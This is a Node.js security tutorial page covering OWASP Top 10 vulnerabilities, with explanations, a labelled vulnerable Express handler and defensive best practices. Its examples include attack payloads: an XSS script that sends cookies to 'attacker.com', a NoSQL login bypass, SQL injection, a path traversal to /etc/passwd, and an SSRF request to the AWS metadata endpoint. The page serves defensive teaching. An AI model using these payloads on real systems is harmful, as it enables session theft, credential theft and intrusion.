# 📌 Topic: Common Vulnerabilities (OWASP Top 10)

## 🧠 Concept Explanation
Security in Node.js is not a "feature" you add at the end; it's a fundamental mindset. Because Node.js is often used for internet-facing APIs, it is the first line of defense against global threats.

**The Castle Defense Analogy (Deep Dive):**
Imagine you are the King/Queen of a massive castle.
*   **Injection (The Trojan Horse):** You allow guests to bring in large crates of "supplies" (User Input). Instead of food, the crates contain soldiers who open the gates from the inside. This is **SQL/NoSQL Injection**. You didn't check the *contents* of the crate; you just assumed it was what they said it was.
*   **XSS (The Poisoned Feast):** An attacker poisons the wine at a feast. They don't hurt you directly, but every guest who drinks the wine (visits your site) gets sick (has their session stolen). The "Poison" is a malicious script.
*   **Prototype Pollution (The Genetic Sabotage):** This is a sci-fi attack. The attacker sneaks into the castle's DNA laboratory and changes the blueprint for "Human Beings." Now, every child born in the kingdom (every object created in JS) has a defect that allows the attacker to control them.
*   **ReDoS (The Endless Labyrinth):** An attacker builds a maze that looks small but has infinite paths. When your guards (The CPU) enter the maze to find a specific person (Regex matching), they get lost forever and can never come back to guard the gate.

---

## 🏗️ Mental Model
Think of security as **Layered Defense**:
1.  **Input Layer:** All data from the outside is "Toxic." It must be cleaned (Sanitized) and checked (Validated).
2.  **Logic Layer:** Even if a user is logged in, do they have the right to do *this* specific thing? (Broken Access Control).
3.  **Dependency Layer:** You are only as strong as your weakest `npm install`. You are trusting thousands of strangers with your server's "Admin" keys.
4.  **Error Layer:** Never let the attacker know *why* they failed. Don't say "Incorrect Password"; say "Invalid Credentials."

---

## ⚡ Actual Behavior
When an attack occurs:
1.  **Exploitation:** The attacker finds an "Interpreter" (SQL engine, V8, OS Shell) that is being fed raw user data.
2.  **Injection:** The attacker sends a payload that "tricks" the interpreter. For example, in SQL, `' OR 1=1 --` tricks the database into thinking the condition is always true.
3.  **Pollution:** In Prototype Pollution, the attacker sends an object like `{"__proto__": {"isAdmin": true}}`. If your code recursively merges this into an existing object, it doesn't just change that one object—it changes the "Blueprint" (Prototype) for all objects.
4.  **Starvation:** In a ReDoS attack, the V8 engine enters a "Catastrophic Backtracking" loop. Because Node.js is single-threaded, if the regex takes 30 seconds to run, your server is literally "frozen" for those 30 seconds.

---

## 🔬 Internal Mechanics (V8 + libuv + OS)
*   **The Prototype Chain:** V8's power comes from inheritance. When you access `obj.admin`, V8 first looks at `obj`. If it's not there, it looks at `obj.__proto__`. If an attacker pollutes `Object.prototype`, they have effectively injected a property into *every* object in your application.
*   **Regex Engine (Backtracking):** V8's regex engine uses a "Nondeterministic Finite Automaton" (NFA). For certain patterns, if a match fails, the engine tries every other possible way to match it. This leads to "Exponential Complexity" ($2^n$), where adding one character to a string doubles the processing time.
*   **The Global Scope:** Node.js has a global object. If a library you use accidentally or maliciously pollutes `global`, every other part of your app is affected.
*   **Environment Variables:** If an attacker gets "Local File Read" access (Path Traversal), they can read your `.env` file. This is the "Game Over" scenario, as they now have your DB passwords, AWS keys, and JWT secrets.
*   **Buffer Overflows (C++ Addons):** While JS is memory-safe, many Node.js libraries use C++ addons. A vulnerability in the C++ layer can allow an attacker to write directly to the OS memory, bypassing V8 entirely.

---

## 🔁 Execution Flow (ReDoS Example)
1.  Attacker sends a request with a very long string.
2.  Node.js tries to match it against a vulnerable regex: `/(a+)+b/`.
3.  V8 spends minutes trying every possible combination of 'a's.
4.  The Event Loop is blocked. The server stops responding to all users.

---

## 🧠 Resource Behavior
*   **CPU:** 100% usage during ReDoS or brute-force attacks.
*   **Memory:** Spikes during Large Payload attacks or XML External Entity (XXE) parsing.

---

## 📐 ASCII Diagrams
```text
PROTOTYPE POLLUTION:
[ Attacker Payload ] --> [ merge(userConfig, payload) ]
                                |
                                v
                    [ Object.prototype ] <--- POLLUTED!
                                |
      +-------------------------+-------------------------+
      |                         |                         |
[ New User Obj ]          [ Admin Check Obj ]       [ Logger Obj ]
(isAdmin = true)          (isAdmin = true)          (isAdmin = true)
```

---

## 🔍 Code Example (Latest Node.js - Prototype Pollution prevention)
```javascript
import express from 'express';
const app = express();

// VULNERABLE:
app.post('/profile', (req, res) => {
    const user = {};
    Object.assign(user, req.body); // If body has "__proto__", game over.
    res.json(user);
});

// SECURE:
app.post('/profile-secure', (req, res) => {
    // 1. Use a library like 'joi' or 'zod' to validate and pick keys
    const { name, age } = req.body;
    const user = { name, age };
    
    // 2. Or, create an object with NO prototype
    const safeObj = Object.create(null);
    
    res.json(user);
});
```

---

## 💥 Production Failures
*   **The Log4j Style Breach:** Using an old version of a popular library (like `minimist` or `lodash`) that has a known prototype pollution vulnerability.
*   **Data Leak via Errors:** Returning a full DB error (including the query) to the client, allowing an attacker to map your table names.

---

## 🧪 Real-time Scenarios
*   **NoSQL Injection:** Sending `{"username": {"$gt": ""}, "password": {"$gt": ""}}` to a MongoDB login endpoint to log in as the first user in the DB.
*   **XSS in Comments:** An attacker posts a comment with `<script>fetch('attacker.com/steal?cookie=' + document.cookie)</script>`. Every user who reads that comment has their session stolen.

---

## ⚠️ Edge Cases
*   **Path Traversal:** `res.sendFile('/uploads/' + req.query.file)` where the attacker sends `file=../../../../etc/passwd`.
*   **SSRF (Server-Side Request Forgery):** Telling the server to fetch a URL: `fetch(req.query.url)` where the attacker sends `url=http://169.254.169.254/latest/meta-data/` to steal AWS credentials.

---

## 🏢 Best Practices
1.  **Sanitize All Inputs:** Treat every byte from a user as radioactive.
2.  **Use `npm audit`:** Run it in your CI/CD to block deployments with vulnerable packages.
3.  **Security Headers:** Use the `helmet` middleware to set `Content-Security-Policy`, `X-Frame-Options`, etc.
4.  **Use Parameterized Queries:** Always.

---

## ⚖️ Trade-offs
*   **Security:** Adds latency (validation), complexity, and development time.
*   **Speed:** Skipping security is faster initially but eventually leads to catastrophic failure and legal/financial ruin.

---

## 💼 Interview Q&A
*   **Q:** What is "Prototype Pollution"?
*   **A:** It's a vulnerability where an attacker can add or modify properties of the base `Object.prototype`, which then affects all objects in the application due to inheritance.

---

## 🧩 Practice Problems
1.  Find a prototype pollution vulnerability in a small script and fix it using `Object.freeze` or `Object.create(null)`.
2.  Write a Regular Expression for an email and check if it is vulnerable to ReDoS using a "Safe Regex" checker.

---
Prev: [02_Authorization.md](./02_Authorization.md) | Index: [NodeJS/00_Index.md](../00_Index.md) | Next: [04_Input_Validation.md](./04_Input_Validation.md)
